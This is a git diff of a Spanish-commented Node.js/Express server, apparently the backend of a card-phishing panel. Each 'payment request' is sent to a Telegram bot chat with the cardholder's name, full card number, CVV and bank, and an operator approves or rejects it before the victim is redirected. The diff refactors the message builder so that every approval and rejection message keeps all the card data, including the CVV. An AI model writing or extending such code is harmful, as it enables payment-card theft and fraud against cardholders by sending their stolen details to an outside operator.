@@ -60,11 +60,7 @@ initDB().catch(err => console.error('❌ initDB:', err));
 // ============================================================
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const body = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text,
-        parse_mode: 'HTML'
-    };
+    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
     if (replyMarkup) body.reply_markup = replyMarkup;
 
     console.log('📤 Telegram sendMessage payload:', JSON.stringify(body, null, 2));
@@ -117,11 +113,10 @@ async function tgAnswerCallback(callbackQueryId, text) {
 }
 
 // ============================================================
-// ENVIAR SOLICITUD A TELEGRAM CON BOTONES
+// CONSTRUIR TEXTO COMPLETO DEL PAGO (para reusar)
 // ============================================================
-async function enviarSolicitudATelegram(pago) {
-    const texto =
-        `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
+function construirTextoPago(pago) {
+    return (
         `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
@@ -129,7 +124,17 @@ async function enviarSolicitudATelegram(pago) {
         `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
-        `🕒 ${new Date().toLocaleString('es-CL')}`;
+        `🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
+    );
+}
+
+// ============================================================
+// ENVIAR SOLICITUD A TELEGRAM CON BOTONES
+// ============================================================
+async function enviarSolicitudATelegram(pago) {
+    const texto =
+        `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` +
+        construirTextoPago(pago);
 
     const replyMarkup = {
         inline_keyboard: [[
@@ -230,7 +235,7 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
 });
 
 // ============================================================
-// WEBHOOK TELEGRAM (recibe clicks de los botones)
+// WEBHOOK TELEGRAM
 // ============================================================
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
@@ -276,14 +281,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             await tgAnswerCallback(cq.id, '✅ Aprobado');
             if (msgId) {
+                // ⚠️ Editar manteniendo TODOS los datos del pago
                 await tgEditMessage(msgId,
                     `✅ <b>PAGO APROBADO</b>\n\n` +
-                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-                    `👤 <b>Titular:</b> ${pago.titular}\n` +
-                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
-                    `🏦 <b>Banco:</b> ${pago.banco_emisor}\n` +
-                    `➡️ <b>Redirigido a:</b> ${archivo}\n` +
-                    `🕒 ${new Date().toLocaleString('es-CL')}`
+                    construirTextoPago(pago) +
+                    `\n➡️ <b>Redirigido a:</b> ${archivo}\n` +
+                    `🕒 <b>Procesado:</b> ${new Date().toLocaleString('es-CL')}`
                 );
             }
         } else if (accion === 'rechazar') {
@@ -297,12 +300,12 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) {
+                // ⚠️ Editar manteniendo TODOS los datos del pago
                 await tgEditMessage(msgId,
                     `❌ <b>PAGO RECHAZADO</b>\n\n` +
-                    `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
-                    `👤 <b>Titular:</b> ${pago.titular}\n` +
-                    `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
-                    `🕒 ${new Date().toLocaleString('es-CL')}`
+                    construirTextoPago(pago) +
+                    `\n📌 <b>Motivo:</b> ${motivo}\n` +
+                    `🕒 <b>Procesado:</b> ${new Date().toLocaleString('es-CL')}`
                 );
             }
         }
@@ -344,5 +347,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🔗 PUBLIC_BACKEND_URL = ${PUBLIC_BACKEND_URL}`);
     console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
     console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
-    registrarWebhook(); // ← registra el webhook solo cada arranque
+    registrarWebhook();
 });
